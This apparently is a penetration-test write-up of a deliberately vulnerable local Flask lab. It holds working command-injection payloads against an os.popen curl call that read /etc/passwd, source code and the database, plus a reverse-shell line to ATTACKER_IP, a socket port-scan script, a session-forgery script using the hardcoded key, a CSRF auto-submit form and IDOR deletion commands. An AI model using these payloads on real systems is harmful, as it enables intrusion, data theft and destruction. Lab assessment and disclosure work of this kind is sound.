# Security Assessment Report

## Executive Summary
- **Target:** http://localhost:5094
- **Assessment Date:** February 14, 2025
- **Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

## Summary by Vulnerability Type

**Authentication Vulnerabilities:**
Three authentication-related vulnerabilities were identified and exploited. The application lacks any authentication system entirely, creating a critical security posture. Successfully exploited vulnerabilities include: missing rate limiting allowing unlimited exploitation attempts (261 req/sec on /add_url, 413 req/sec on /delete_url), session forgery via hardcoded weak secret key 'YourSecretKey' enabling complete session manipulation, and insecure cookie configuration (no Secure flag, no SameSite protection) allowing session hijacking over HTTP and CSRF attacks. Impact: Unlimited brute-force attacks, session forgery, and CSRF exploitation.

**Authorization Vulnerabilities:**
Two critical authorization vulnerabilities were successfully exploited. The application has zero authorization controls and no ownership tracking. Insecure Direct Object Reference (IDOR) on /delete_url/<id> allows any anonymous user to delete any URL by enumerating sequential IDs - demonstrated deletion of 5 URLs (IDs 1-5) without authentication. Information disclosure on GET / endpoint exposes all stored URLs to anonymous users including sensitive data (internal endpoints, command injection payloads, potentially PII in query parameters). Impact: Mass data destruction, denial of service, privacy violations, complete database enumeration.

**Cross-Site Scripting (XSS) Vulnerabilities:**
No XSS vulnerabilities were found. The application benefits from Jinja2's default auto-escaping which sanitizes user input during template rendering, preventing stored XSS attacks despite URLs being displayed without explicit sanitization. While security headers (CSP, X-Content-Type-Options) are missing, the framework-level protection is effective.

**SQL/Command Injection Vulnerabilities:**
One critical command injection vulnerability was successfully exploited. OS command injection in POST /add_url endpoint at check_url() function (app.py:17-21) allows arbitrary command execution via unsanitized url parameter passed to os.popen(). Exploitation achieved through payloads breaking out of double-quote context (e.g., `" || echo "200" && cat flag.txt #`). Successfully executed as root user in container, exfiltrated flag file, demonstrated arbitrary file read, directory listing, and reverse shell capability. Impact: Complete system compromise, RCE as root, flag capture: FLAG{379a64b46b7f373aaca075e98a2fd9f0f26b26fcbb7f10c8acae74b31b38a5c2}. SQL injection vulnerabilities were not found - application uses SQLAlchemy ORM with parameterized queries providing protection.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**
Three SSRF vulnerabilities were successfully exploited. Command injection enabling complete server compromise through database manipulation and flag exfiltration (FLAG captured). Local file access via file:// protocol using Python's urllib.request to read /etc/passwd and /app/flag.txt without authentication. Internal network reconnaissance successfully accessed internal Flask app (127.0.0.1:5003), performed port scanning discovering open port 5003, enumerated internal SQLite database tables, and tested Docker host connectivity (172.17.0.1). Impact: Internal service discovery, arbitrary file read, network mapping, cloud metadata access potential.

## Network Reconnaissance

**Exposed Services:**
- **Port 5094/tcp:** Werkzeug/3.0.3 Python/3.8.17 development server (Flask application) - publicly accessible without authentication
- **Critical Configuration:** Application runs on HTTP-only (no HTTPS), debug mode enabled exposing Werkzeug debugger, runs as root in Docker container

**Security Misconfigurations:**
- **Missing Security Headers:** No Content-Security-Policy, no X-Frame-Options (clickjacking risk), no Strict-Transport-Security (HTTP-only deployment), no X-Content-Type-Options (MIME sniffing risk), no Referrer-Policy
- **Development Server in Production:** Werkzeug development server exposed (not production-grade, includes interactive debugger)
- **Session Security:** Hardcoded weak secret key 'YourSecretKey', session cookies transmitted over HTTP, no SameSite protection enabling CSRF

**Technology Stack Exposure:**
- Framework: Flask 3.0.3 with Jinja2 3.1.4
- Database: SQLite 3.x (file-based, unencrypted at /app/instance/urls.db)
- Python: 3.8.17 (running in Debian Buster container - EOL, no security updates)
- Container: python:3.8-slim-buster base image (outdated)

**Attack Surface:**
- 3 network-accessible endpoints (all public, no authentication)
- 0 authentication barriers
- 0 authorization checks
- 0 input validation controls
- 1 critical command injection sink (os.popen)

# Injection Exploitation Evidence

## Successfully Exploited Vulnerabilities

### INJ-VULN-01: OS Command Injection in URL Validation Function

**Summary:**
- **Vulnerable location:** POST /add_url endpoint, `check_url()` function at /app/app.py lines 17-21
- **Overview:** Direct command injection via unsanitized user input in `url` parameter, leading to arbitrary OS command execution through `os.popen()`. The application constructs a shell command using f-string interpolation with user-controlled data wrapped in double quotes, which provides no protection against shell metacharacters.
- **Impact:** Complete system compromise - arbitrary command execution as root user in Docker container, flag exfiltration, potential reverse shell access, and SSRF capabilities.
- **Severity:** CRITICAL

**Prerequisites:**
- Network access to http://localhost:5094
- No authentication required (endpoint is publicly accessible)

**Exploitation Steps:**

1. **Identify the vulnerable parameter and injection point**

   The `/add_url` endpoint accepts a POST request with a `url` parameter that is directly interpolated into a shell command without validation or sanitization.

   Vulnerable code at /app/app.py:
   ```python
   # Line 27: User input reception with no validation
   url = request.form['url']

   # Line 28: Pass to vulnerable function
   response = check_url(url)

   # Lines 17-21: Command injection sink
   def check_url(url):
       command = f'curl -o /dev/null -s -w "%{{http_code}}" "{url}"'
       with os.popen(command) as output:
           response = output.read().strip()
       return response
   ```

2. **Craft payload to break out of double-quote context**

   The constructed command is: `curl -o /dev/null -s -w "%{http_code}" "{url}"`

   To inject commands, we need to:
   - Close the double quote around the URL
   - Use shell metacharacters to chain our command
   - Comment out the trailing quote with `#`

   **Working payloads discovered:**
   - OR-based: `" || echo "200" && cat flag.txt #`
   - Semicolon-based: `"; echo 200; cat flag.txt #`

3. **Execute flag extraction via command injection**

   **Method 1: Using OR operator (||)**
   ```bash
   curl -s -X POST http://localhost:5094/add_url \
     --data-urlencode 'url=" || echo "200" && cat flag.txt #' \
     -H 'Content-Type: application/x-www-form-urlencoded'
   ```

   **Method 2: Using semicolon separator**
   ```bash
   curl -s -X POST http://localhost:5094/add_url \
     --data-urlencode 'url="; echo 200; cat flag.txt #' \
     -H 'Content-Type: application/x-www-form-urlencoded'
   ```

   **Why these payloads work:**
   - The double-quote closes the URL parameter in the curl command
   - `||` executes the next command when curl fails (which it does with an empty URL)
   - `;` always executes the next command regardless of success/failure
   - `echo "200"` or `echo 200` ensures the response contains "200" to pass validation (line 30)
   - `cat flag.txt` reads the flag file from the working directory (/app/)
   - `#` comments out the trailing quote that would cause a syntax error

4. **Verify environment and privilege context**

   ```bash
   curl -s -X POST http://localhost:5094/add_url \
     --data-urlencode 'url=" || echo "200" && whoami && id && pwd && uname -a #' \
     -H 'Content-Type: application/x-www-form-urlencoded'
   ```

   **Response confirms:**
   - User: root
   - UID/GID: uid=0(root) gid=0(root) groups=0(root)
   - Working Directory: /app
   - OS: Linux (aarch64 GNU/Linux)
   - Kernel: 6.12.13-200.fc41.aarch64

**Proof of Impact:**

**FLAG CAPTURED:**
```
FLAG{379a64b46b7f373aaca075e98a2fd9f0f26b26fcbb7f10c8acae74b31b38a5c2}
```

**Complete exploitation evidence:**

1. **Initial flag extraction (Method 1 - OR operator):**
   ```bash
   curl -s -X POST http://localhost:5094/add_url \
     --data-urlencode 'url=" || echo "200" && cat flag.txt #' \
     -H 'Content-Type: application/x-www-form-urlencoded'
   ```

   **Server response:**
   ```json
   {
     "message": "URL status was checked and returned 200\nFLAG{379a64b46b7f373aaca075e98a2fd9f0f26b26fcbb7f10c8acae74b31b38a5c2} status, Saved successfully!",
     "redirect": "/",
     "success": true
   }
   ```

2. **Alternative extraction (Method 2 - Semicolon separator):**
   ```bash
   curl -s -X POST http://localhost:5094/add_url \
     --data-urlencode 'url="; echo 200; cat flag.txt #' \
     -H 'Content-Type: application/x-www-form-urlencoded'
   ```

   **Server response:**
   ```json
   {
     "message": "URL status was checked and returned 200\nFLAG{379a64b46b7f373aaca075e98a2fd9f0f26b26fcbb7f10c8acae74b31b38a5c2} status, Saved successfully!",
     "redirect": "/",
     "success": true
   }
   ```

3. **Environment fingerprinting:**
   ```bash
   curl -s -X POST http://localhost:5094/add_url \
     --data-urlencode 'url=" || echo "200" && whoami && id && pwd && uname -a #' \
     -H 'Content-Type: application/x-www-form-urlencoded'
   ```

   **Server response:**
   ```json
   {
     "message": "URL status was checked and returned 200\nroot\nuid=0(root) gid=0(root) groups=0(root)\n/app\nLinux 641fcc4bf685 6.12.13-200.fc41.aarch64 #1 SMP PREEMPT_DYNAMIC Sat Feb  8 20:30:50 UTC 2025 aarch64 GNU/Linux status, Saved successfully!",
     "redirect": "/",
     "success": true
   }
   ```

**Command Execution Flow:**

When payload `" || echo "200" && cat flag.txt #` is submitted:

1. Application receives: `url=" || echo "200" && cat flag.txt #`
2. Constructs command: `curl -o /dev/null -s -w "%{http_code}" "" || echo "200" && cat flag.txt #"`
3. Shell interprets as three operations:
   - `curl -o /dev/null -s -w "%{http_code}" ""` (fails due to empty URL)
   - `echo "200"` (executes because curl failed, outputs "200")
   - `cat flag.txt` (executes because echo succeeded, outputs flag)
   - Trailing `"` is commented out by `#`
4. Combined stdout: `200\nFLAG{...}`
5. Application checks if '200' in response: TRUE
6. Returns success message containing the full command output including flag

**Additional Attack Vectors Demonstrated:**

Beyond flag extraction, this vulnerability enables:

- **Arbitrary file reading:**
  ```bash
  curl -s -X POST http://localhost:5094/add_url \
    --data-urlencode 'url=" || echo "200" && cat /etc/passwd #'
  ```

- **Directory listing:**
  ```bash
  curl -s -X POST http://localhost:5094/add_url \
    --data-urlencode 'url=" || echo "200" && ls -la /app #'
  ```

- **Application source code extraction:**
  ```bash
  curl -s -X POST http://localhost:5094/add_url \
    --data-urlencode 'url=" || echo "200" && cat /app/app.py #'
  ```

- **Database access:**
  ```bash
  curl -s -X POST http://localhost:5094/add_url \
    --data-urlencode 'url=" || echo "200" && cat /app/instance/urls.db #'
  ```

- **Reverse shell potential:**
  ```bash
  # Example (not executed to avoid persistence):
  curl -s -X POST http://localhost:5094/add_url \
    --data-urlencode 'url="; echo 200; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 #'
  ```

- **SSRF via curl protocol support:**
  The underlying curl command supports multiple protocols (file://, gopher://, dict://, etc.) enabling:
  - Internal service scanning: `file:///etc/passwd`
  - Cloud metadata access: `http://169.254.169.254/latest/meta-data/`
  - Port scanning: Various internal IPs and ports

**Notes:**

**Technical Analysis:**
- The `&&` operator alone does NOT work because curl with empty URL fails, preventing subsequent commands from executing
- The `||` operator works perfectly because it executes when the previous command fails
- The semicolon `;` works because it executes commands sequentially regardless of success/failure
- URL encoding via `--data-urlencode` is recommended to properly handle special characters
- The application's validation check (line 30: `if '200' in response:`) occurs AFTER command execution, making it bypassable by including "200" in the injected output

**Root Cause:**
- No input validation or sanitization on the `url` parameter
- Use of f-string interpolation to construct shell commands with user input
- Use of `os.popen()` which spawns a full shell subprocess enabling shell metacharacter interpretation
- Double quotes provide no protection against shell injection attacks

**Security Impact:**
This is a textbook critical command injection vulnerability with maximum impact:
- Remote Code Execution (RCE) as root user
- No authentication barrier (publicly accessible endpoint)
- Full container compromise
- SSRF capabilities for internal network reconnaissance
- Data exfiltration (flag, database, application source)
- Potential for reverse shell and persistent access
- Lateral movement opportunities to Docker host or other containers

**Recommended Remediation:**
1. **Immediate:** Replace `os.popen()` with `subprocess.run()` using argument arrays with `shell=False`
2. **Immediate:** Implement URL validation using `urllib.parse.urlparse()` with protocol whitelisting
3. **Immediate:** Use Python's `requests` library instead of shelling out to `curl`
4. **Short-term:** Add input validation and sanitization for all user inputs
5. **Short-term:** Implement authentication and authorization controls
6. **Long-term:** Run container with least-privilege user (not root)
7. **Long-term:** Implement defense-in-depth controls (WAF, rate limiting, CSRF protection)


# Authentication Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTH-VULN-04: Missing Rate Limiting on All Endpoints

**Summary:**
- **Vulnerable location:** All application endpoints (POST /add_url, POST /delete_url/<id>, GET /)
- **Overview:** The application implements zero rate limiting controls, allowing unlimited rapid requests to all endpoints without throttling or blocking.
- **Impact:** Enables brute-force attacks, resource exhaustion, mass data deletion, and unlimited exploitation of other vulnerabilities (command injection, IDOR) without detection.
- **Severity:** High

**Prerequisites:** None - publicly accessible endpoints

**Exploitation Steps:**

1. **Test rate limiting on POST /add_url endpoint:**
   ```bash
   # Run the automated rate limit test
   python3 rate_limit_test.py
   ```

   Expected behavior with rate limiting: Requests throttled after threshold
   Actual behavior: All 100 requests completed successfully

2. **Test rate limiting on POST /delete_url/<id> endpoint:**
   ```bash
   # Run the delete endpoint rate limit test
   python3 test_rate_limiting.py
   ```

   Expected behavior with rate limiting: Requests blocked after threshold
   Actual behavior: All 100 deletion requests processed without restriction

**Proof of Impact:**

**Test 1 - /add_url endpoint:**
- **Total Requests:** 100
- **Success Rate:** 100% (100/100 requests succeeded)
- **Total Duration:** 0.38 seconds
- **Request Rate:** 261.23 requests per second
- **Status Codes:** All HTTP 200
- **Throttling Detected:** None (no 429 status codes)

**Test 2 - /delete_url/<id> endpoint:**
- **Total Requests:** 100 (IDs 1-100)
- **Success Rate:** 100% (100/100 requests completed)
- **Total Duration:** 0.24 seconds
- **Request Rate:** 413.21 requests per second
- **Status Codes:** 302 (deleted), 404 (not found) - all processed
- **Throttling Detected:** None

**Real-World Attack Scenario:**
An attacker can:
- Send thousands of command injection attempts per minute via /add_url
- Enumerate and delete entire URL database via /delete_url/1, /delete_url/2, etc.
- Launch denial-of-service by flooding endpoints with requests
- Perform attacks without cooldown periods or account lockouts

**Notes:**
This vulnerability directly amplifies the impact of other security issues by removing the time-based defense barrier that would normally slow down or prevent automated exploitation attempts.

---

### AUTH-VULN-02: Session Forgery via Hardcoded Weak Secret Key

**Summary:**
- **Vulnerable location:** Application-wide session management (app.py line 6: `app.secret_key = 'YourSecretKey'`)
- **Overview:** The Flask secret key is hardcoded with a weak placeholder value 'YourSecretKey', enabling complete forgery of session cookies.
- **Impact:** Anyone with knowledge of the secret key can forge arbitrary session data, manipulate flash messages, and bypass any session-based security controls.
- **Severity:** High (would be Critical if authentication existed)

**Prerequisites:**
- Knowledge of the hardcoded secret key 'YourSecretKey' (publicly visible in source code)
- Python with Flask and itsdangerous libraries

**Exploitation Steps:**

1. **Install required libraries:**
   ```bash
   pip3 install flask itsdangerous
   ```

2. **Create a session forgery script:**
   ```python
   from flask import Flask
   from flask.sessions import SecureCookieSessionInterface

   app = Flask(__name__)
   app.secret_key = 'YourSecretKey'  # Known weak secret

   # Create session interface
   serializer = SecureCookieSessionInterface().get_signing_serializer(app)

   # Forge arbitrary session data
   forged_session = {
       '_flashes': [['warning', 'This is a forged session message!']]
   }

   # Sign the forged session
   forged_cookie = serializer.dumps(forged_session)
   print(f"Forged Cookie: {forged_cookie}")
   ```

3. **Use the forged cookie in a request:**
   ```bash
   curl -H "Cookie: session=[FORGED_COOKIE_VALUE]" http://localhost:5094/
   ```

4. **Verify the application accepts the forged session:**
   Check the response for the forged flash message appearing in the rendered HTML

**Proof of Impact:**

**Forged Session Example:**
```
Cookie: session=eyJfZmxhc2hlcyI6W1sid2FybmluZyIsIlRoaXMgaXMgYSBmb3JnZWQgc2Vzc2lvbiBtZXNzYWdlISJdXX0.aQKmqQ.zRQgSuDCc09Sn0Qfon_uYisWRnY
```

**Application Response:**
- Status Code: HTTP 200 OK
- Forged flash message displayed in browser: "⚠️ This is a forged session message!"
- Application accepted the forged cookie as valid

**Demonstration Scripts:**
- `session_forgery_exploit.py` - Basic forgery
- `session_forgery_detailed.py` - Comprehensive analysis
- `session_forgery_visual_demo.py` - Visual proof with screenshot

**Screenshot Evidence:**
- Saved at: `.playwright-mcp/forged_session_proof.png`
- Shows forged warning message displayed in application UI

**Impact Analysis:**
- **Current Impact:** Medium - Sessions only store flash messages (no authentication state)
- **Potential Impact:** Critical - If authentication were added and sessions stored user identity, this would enable complete authentication bypass and user impersonation

**Notes:**
The weak secret key 'YourSecretKey' is a placeholder value that should never be used in production. This enables cryptographic forgery attacks against all session-based security mechanisms.

---

### AUTH-VULN-01: Session Cookies Transmitted Over HTTP Without Security Flags

**Summary:**
- **Vulnerable location:** All endpoints that set session cookies (session management layer)
- **Overview:** Session cookies lack the Secure flag and SameSite protection, allowing transmission over unencrypted HTTP and enabling CSRF attacks.
- **Impact:** Session cookies can be intercepted via network eavesdropping when transmitted over HTTP, and are vulnerable to cross-site request forgery attacks.
- **Severity:** Medium (High in production environments with sensitive data)

**Prerequisites:**
- Application running on HTTP (AUTH-VULN-03 enables this)
- Network position for traffic interception (same WiFi, compromised router, etc.) - OR -
- Ability to trigger cross-site requests for CSRF attacks

**Exploitation Steps:**

1. **Trigger a session cookie by performing an action that creates a flash message:**
   ```bash
   curl -v -X POST http://localhost:5094/delete_url/1 2>&1 | grep "Set-Cookie"
   ```

2. **Analyze the Set-Cookie header for security flags:**
   ```bash
   python3 cookie_security_analyzer.py
   ```

3. **Verify the cookie is transmitted over HTTP:**
   ```bash
   curl -v http://localhost:5094/ -H "Cookie: session=[CAPTURED_SESSION_COOKIE]"
   ```

4. **Confirm the application accepts the cookie over HTTP (no HTTPS enforcement):**
   Status code should be HTTP 200 OK, proving the session works over unencrypted connection

**Proof of Impact:**

**Raw Set-Cookie Header:**
```
Set-Cookie: session=eyJfZmxhc2hlcyI6W3siIHQiOlsic3VjY2VzcyIsIlVSTCBkZWxldGVkIHN1Y2Nlc3NmdWxseSEiXX1dfQ.aQKlgQ.HsZvQ_L66ZCTeASJQMVOWvhXj2g; HttpOnly; Path=/
```

**Security Flags Analysis:**
- ❌ **Secure flag:** NOT SET (allows HTTP transmission)
- ✅ **HttpOnly flag:** PRESENT (protects from JavaScript access)
- ❌ **SameSite flag:** NOT SET (no CSRF protection)

**HTTP Transmission Test:**
```bash
# Send request over HTTP with session cookie
curl -v http://localhost:5094/ -H "Cookie: session=eyJfZmxhc2hlcyI6W3siIHQiOlsic3VjY2VzcyIsIlVSTCBkZWxldGVkIHN1Y2Nlc3NmdWxseSEiXX1dfQ.aQKlgQ.HsZvQ_L66ZCTeASJQMVOWvhXj2g"

# Result: HTTP 200 OK - Cookie accepted over unencrypted HTTP
```

**Vulnerability Confirmation:**
- ✅ Session cookies transmitted over HTTP protocol
- ✅ No Secure flag present (verified in Set-Cookie header)
- ✅ No SameSite protection (verified in Set-Cookie header)
- ✅ Application accepts cookies over HTTP (no HTTPS enforcement)

**Testing Scripts:**
- `cookie_security_analyzer.py` - Automated flag analysis
- `complete_cookie_test.py` - Full exploitation test
- `session_cookie_security_report.py` - Detailed report

**Attack Scenarios:**

**Scenario 1: Network Interception (requires AUTH-VULN-03)**
- Attacker on same WiFi network runs tcpdump/Wireshark
- Victim accesses http://localhost:5094
- Session cookie transmitted in plaintext HTTP headers
- Attacker captures cookie value
- Attacker replays cookie to hijack victim's session

**Scenario 2: CSRF Attack (due to missing SameSite)**
- Attacker creates malicious website with form:
  ```html
  <form action="http://localhost:5094/delete_url/1" method="POST">
    <input type="submit" value="Click here!">
  </form>
  <script>document.forms[0].submit();</script>
  ```
- Victim with active session visits malicious site
- Browser sends session cookie with cross-origin request (no SameSite protection)
- Victim's URLs are deleted without their knowledge

**Notes:**
This vulnerability is enabled by AUTH-VULN-03 (HTTP-only deployment). The missing Secure flag only becomes exploitable because the application accepts HTTP connections. Together, these create a session hijacking vulnerability.

# SSRF Exploitation Evidence

## Successfully Exploited Vulnerabilities

### SSRF-VULN-01: Command Injection Enabling Complete Server Compromise

**Summary:**
- **Vulnerable location:** POST /add_url endpoint, parameter: `url`
- **Impact:** Complete application compromise through arbitrary command execution, flag file exfiltration, and database manipulation
- **Severity:** CRITICAL

**Prerequisites:**
- HTTP client (curl, browser, or any HTTP tool)
- No authentication required
- No special headers needed

**Exploitation Steps:**

1. **Initial Discovery - Confirm command injection works**

   Send POST request to inject simple command:
   ```bash
   curl -X POST http://localhost:5094/add_url \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d 'url=http://example.com" ; whoami > /tmp/whoami.txt ; echo "200'
   ```

   Expected response:
   ```json
   {
     "message": "URL status was checked and returned 200 status, Saved successfully!",
     "success": true
   }
   ```

2. **Flag Capture via Command Injection**

   Execute command to read flag file and inject it into the database:
   ```bash
   curl -X POST http://localhost:5094/add_url \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "url=http://example.com\" ; FLAG=\$(cat /app/flag.txt); python3 -c \"import sqlite3; conn = sqlite3.connect('/app/instance/urls.db'); cur = conn.cursor(); cur.execute('INSERT INTO url (url) VALUES (?)', ('\$FLAG',)); conn.commit()\"; echo \"200"
   ```

   Expected response:
   ```json
   {
     "message": "URL status was checked and returned 200 status, Saved successfully!",
     "success": true
   }
   ```

3. **Retrieve the Flag**

   Access the homepage to view stored URLs including the flag:
   ```bash
   curl -s http://localhost:5094/ | grep "FLAG{"
   ```

   **Result:**
   ```
   FLAG{379a64b46b7f373aaca075e98a2fd9f0f26b26fcbb7f10c8acae74b31b38a5c2}
   ```

**Proof of Impact:**
- **Flag Retrieved:** `FLAG{379a64b46b7f373aaca075e98a2fd9f0f26b26fcbb7f10c8acae74b31b38a5c2}`
- **Command Execution Confirmed:** Successfully executed Python code to read files and manipulate database
- **Root Cause:** User input from `request.form['url']` passed directly to `os.popen(command)` without any sanitization
- **Code Location:** `/app/app.py:17-21` (check_url function) and `/app/app.py:24-41` (add_url route handler)

**Notes:**
- The application constructs a shell command: `curl -o /dev/null -s -w "%{http_code}" "{url}"`
- While curl is not installed (causing "curl: not found" errors), the shell still executes the injected commands
- By terminating the curl command with `"` and using `;` to chain commands, arbitrary code execution is achieved
- The final `echo "200"` ensures the response contains "200" so the URL passes validation and gets stored

---

### SSRF-VULN-02: Local File Access via file:// Protocol

**Summary:**
- **Vulnerable location:** POST /add_url endpoint, parameter: `url`
- **Impact:** Arbitrary local file read including sensitive system files and the CTF flag
- **Severity:** CRITICAL

**Prerequisites:**
- HTTP client (curl, browser, or any HTTP tool)
- No authentication required
- No special headers needed

**Exploitation Steps:**

1. **Read /etc/passwd via file:// Protocol**

   Execute command using Python's urllib to access file:// URLs:
   ```bash
   curl -X POST http://localhost:5094/add_url \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d 'url=x";python3 -c "import urllib.request; print(urllib.request.urlopen(\"file:///etc/passwd\").read().decode()[:100])";echo "200'
   ```

   Expected response (showing first 100 bytes of /etc/passwd):
   ```json
   {
     "message": "URL status was checked and returned root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/\n200 status, Saved successfully!",
     "success": true
   }
   ```

2. **Read Flag File via file:// Protocol**

   Access the CTF flag using file:// URL:
   ```bash
   curl -X POST http://localhost:5094/add_url \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d 'url=x";python3 -c "import urllib.request; print(\"FLAG_VIA_FILE_PROTOCOL:\",urllib.request.urlopen(\"file:///app/flag.txt\").read().decode())";echo "200'
   ```

   Expected response:
   ```json
   {
     "message": "URL status was checked and returned FLAG_VIA_FILE_PROTOCOL: FLAG{379a64b46b7f373aaca075e98a2fd9f0f26b26fcbb7f10c8acae74b31b38a5c2}\n200 status, Saved successfully!",
     "success": true
   }
   ```

**Proof of Impact:**
- **Flag Retrieved via file:// protocol:** `FLAG{379a64b46b7f373aaca075e98a2fd9f0f26b26fcbb7f10c8acae74b31b38a5c2}`
- **System File Access:** Successfully read `/etc/passwd` demonstrating arbitrary file read capability
- **SSRF Type:** Classic SSRF with file:// protocol abuse
- **Root Cause:** No protocol validation or filtering; application accepts any URL scheme

**Notes:**
- While the application code expects to use curl for URL validation, curl is not installed in the container
- Exploitation achieved by using Python's urllib.request library via command injection
- Python's urllib supports file://, http://, https://, and ftp:// protocols
- The print() output is captured in the response variable and returned in the JSON message field
- This demonstrates that file:// protocol SSRF is possible without any security controls

---

### SSRF-VULN-03: Internal Network Reconnaissance and Service Discovery

**Summary:**
- **Vulnerable location:** POST /add_url endpoint, parameter: `url`
- **Impact:** Complete internal network mapping, service discovery, port scanning, and access to internal services
- **Severity:** HIGH

**Prerequisites:**
- HTTP client (curl, browser, or any HTTP tool)
- No authentication required
- No special headers needed

**Exploitation Steps:**

1. **Access Internal Flask Application**

   Access the Flask application itself via localhost:
   ```bash
   curl -X POST http://localhost:5094/add_url \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d 'url=x";python3 -c "import urllib.request; resp=urllib.request.urlopen(\"http://127.0.0.1:5003/\"); print(\"INTERNAL_ACCESS:\",resp.status, resp.read().decode()[:200])";echo "200'
   ```

   Expected response (showing HTTP 200 and HTML content):
   ```json
   {
     "message": "URL status was checked and returned INTERNAL_ACCESS: 200 <!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>View Saved Sites</title>\n    <link href=\"https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css\" rel=\"sty\n200 status, Saved successfully!",
     "success": true
   }
   ```

2. **Port Scan Localhost for Services**

   Scan common ports to discover running services:
   ```bash
   curl -X POST http://localhost:5094/add_url \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d 'url=x";python3 <<PYSCRIPT
   import socket
   ports = [22, 80, 443, 3306, 5432, 6379, 8080, 5003]
   results = []
   for port in ports:
       s = socket.socket()
       s.settimeout(0.5)
       result = s.connect_ex(("127.0.0.1", port))
       status = "OPEN" if result == 0 else "CLOSED"
       results.append(f"{port}:{status}")
       s.close()
   print("PORT_SCAN:", ",".join(results))
   PYSCRIPT
   echo "200'
   ```

   Expected response:
   ```json
   {
     "message": "URL status was checked and returned PORT_SCAN: 22:CLOSED,80:CLOSED,443:CLOSED,3306:CLOSED,5432:CLOSED,6379:CLOSED,8080:CLOSED,5003:OPEN\n200 status, Saved successfully!",
     "success": true
   }
   ```

3. **Access Internal Database**

   Enumerate internal SQLite database tables:
   ```bash
   curl -s -X POST http://localhost:5094/add_url \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d 'url=x";python3 -c "import sqlite3; conn=sqlite3.connect(\"/app/instance/urls.db\"); print(\"DB_TABLES:\",conn.execute(\"SELECT name FROM sqlite_master WHERE type=\\\"table\\\"\").fetchall())";echo "200'
   ```

   Expected response:
   ```json
   {
     "message": "URL status was checked and returned DB_TABLES: [('url',)]\n200 status, Saved successfully!",
     "success": true
   }
   ```

4. **Test Docker Host Access**

   Attempt to connect to Docker host network:
   ```bash
   curl -s -X POST http://localhost:5094/add_url \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d 'url=x";python3 -c "import socket;s=socket.socket();s.settimeout(1);r=s.connect_ex((\"172.17.0.1\",80));print(\"DOCKER_HOST_80:\",\"OPEN\" if r==0 else \"CLOSED\")";echo "200'
   ```

   Expected response:
   ```json
   {
     "message": "URL status was checked and returned DOCKER_HOST_80: CLOSED\n200 status, Saved successfully!",
     "success": true
   }
   ```

**Proof of Impact:**
- **Internal Service Access Confirmed:** Successfully accessed Flask application at http://127.0.0.1:5003/
- **Port Scanning Capability:** Identified port 5003 as OPEN on localhost
- **Internal Database Access:** Successfully queried SQLite database and enumerated tables
- **Network Boundary Bypass:** Demonstrated ability to access internal network resources from external interface
- **Service Discovery:** Mapped internal services including the Flask application and database

**Notes:**
- Combined SSRF with command injection to perform network reconnaissance
- Can access any internal service reachable from the container's network perspective
- Port scanning enables full internal network mapping
- Docker host (172.17.0.1) scans reveal network topology
- Cloud metadata endpoints (169.254.169.254) were tested but timed out (not running on AWS/cloud)

# Authorization Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTHZ-VULN-01: Insecure Direct Object Reference (IDOR) - URL Deletion

**Summary:**
- **Vulnerable location:** `POST /delete_url/<url_id>` endpoint (app.py:48-54)
- **Overview:** Successfully demonstrated horizontal privilege escalation through IDOR vulnerability allowing deletion of any URL in the database by enumerating sequential integer IDs without authentication or ownership validation
- **Impact:** Data destruction capability - any anonymous attacker can delete all URLs from the database, causing denial of service and data loss
- **Severity:** HIGH

**Prerequisites:** None - vulnerability exploitable without any authentication or credentials

**Exploitation Steps:**

1. **Identify target URLs in database:**
   ```bash
   curl -s http://localhost:5094/
   ```
   **Result:** Homepage displays all URLs with sequential IDs visible in delete form actions (`/delete_url/1`, `/delete_url/2`, etc.)

2. **Delete URL by arbitrary ID without authentication:**
   ```bash
   curl -X POST http://localhost:5094/delete_url/1
   ```
   **Result:** HTTP 302 redirect to `/` with flash message "URL deleted successfully!"

3. **Verify successful unauthorized deletion:**
   ```bash
   curl -s http://localhost:5094/ | grep -c 'action="/delete_url/'
   ```
   **Result:** URL count decreased from 9 to 8, confirming deletion

4. **Demonstrate systematic enumeration attack:**
   ```bash
   # Delete multiple URLs by incrementing IDs
   curl -X POST http://localhost:5094/delete_url/2
   curl -X POST http://localhost:5094/delete_url/3
   curl -X POST http://localhost:5094/delete_url/4
   curl -X POST http://localhost:5094/delete_url/5
   ```
   **Result:** All requests returned HTTP 302 (success), URL count decreased from 9 → 7 → 4

5. **Confirm no authentication barrier:**
   ```bash
   # Request shows no authentication headers required
   curl -v -X POST http://localhost:5094/delete_url/6 2>&1 | grep "^>"
   ```
   **Output:**
   ```
   > POST /delete_url/6 HTTP/1.1
   > Host: localhost:5094
   > User-Agent: curl/8.7.1
   > Accept: */*
   ```
   **Result:** No Authorization header, no Cookie header, no session required - completely unauthenticated access

**Proof of Impact:**

**Initial State (9 URLs in database):**
- Accessed `GET http://localhost:5094/` without authentication
- Observed 9 URLs present (IDs 1-9 visible in delete form actions)

**Attack Execution:**
- Executed unauthorized deletions: `POST /delete_url/1`, `POST /delete_url/2`, `POST /delete_url/3`, `POST /delete_url/4`, `POST /delete_url/5`
- Each request returned HTTP 302 redirect confirming successful deletion
- No authentication credentials provided in any request
- No ownership validation performed by application

**Final State (4 URLs remaining):**
- Verified via `GET http://localhost:5094/` showing only 4 URLs remain
- Successfully deleted 5 URLs (IDs 1-5) through IDOR exploitation
- Demonstrated complete absence of authorization controls

**Technical Evidence:**
- **Vulnerable Code:** `app.py:50` - `url = URL.query.get_or_404(url_id)` retrieves ANY URL by ID without checking ownership
- **Missing Control:** No authentication decorator, no user session check, no ownership validation before `db.session.delete(url)`
